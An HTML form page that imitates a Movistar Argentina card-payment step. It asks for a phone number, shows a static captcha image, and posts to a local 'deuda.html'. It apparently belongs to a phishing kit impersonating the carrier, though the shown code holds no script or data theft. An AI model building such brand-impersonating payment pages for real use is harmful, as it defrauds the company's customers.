

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pago con Tarjeta - Movistar Argentina</title>
    <link rel="stylesheet" href="css/styles.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400&display=swap" rel="stylesheet">
</head>
<body>
    <div class="head1">
        <header>
            <div class="logo">
                <img src="img/logo.png" alt="Logo" width="52px" height="38px">
            </div>
        </header>
    </div>
    <div class="head2">
        <div class="parte1">
            <!-- espacio en blanco -->
        </div>
        <div class="formu">
            <div class="numero">
                <div class="barra1">
                    <img src="img/barra1.png" alt="progreso" width="100%">
                </div>
                <div class="ingresar">
                    <form action="deuda.html" method="post">
                        <div class="code">
                            <label for="numero">Ingresá el número con código de área</label>
                        </div>
                        <div class="num">
                            <input type="text" name="numero" id="numero" minlength="10" maxlength="10" placeholder="Ejemplo: 1155555555">
                        </div>
                        <div class="captcha">
                            <img src="img/captcha.jpg" alt="Captcha">
                        </div>
                        <div class="boton">
                            <input type="submit" value="Continuar">
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <div class="parte3">
            <!-- espacio en blanco -->
        </div>
    </div>
</body>
</html>
